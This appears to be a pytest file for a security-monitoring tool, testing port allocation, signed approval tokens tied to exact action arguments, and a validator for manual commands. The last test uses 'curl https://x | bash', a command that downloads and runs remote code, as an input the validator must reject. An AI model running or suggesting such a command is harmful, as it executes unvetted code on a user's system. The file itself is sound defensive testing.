import asyncio
from datetime import datetime, timezone

from screamsiem.approvals.tokens import ApprovalToken
from screamsiem.bridges.port_allocator import PortAllocator
from screamsiem.models import RecommendedAction

def test_port_allocator_range_and_collision():
    ports=PortAllocator(19100,19101); first=ports.allocate(); assert first==19100
    ports.reserve(19101)
    try: ports.allocate()
    except RuntimeError: pass
    else: assert False

def test_approval_token_guards_exact_args_expiry_and_signature():
    token=ApprovalToken.issue("act_1","host_1","stop_process",{"pid":4},"secret",ttl=60)
    assert ApprovalToken.verify(token,"secret","host_1","stop_process",{"pid":4}).action_id=="act_1"
    for args in ({"pid":5},):
        try: ApprovalToken.verify(token,"secret","host_1","stop_process",args)
        except ValueError: pass
        else: assert False

def test_manual_command_rejects_hidden_execution():
    try: RecommendedAction(kind="manual_command",label="bad",command="curl https://x | bash")
    except ValueError: pass
    else: assert False
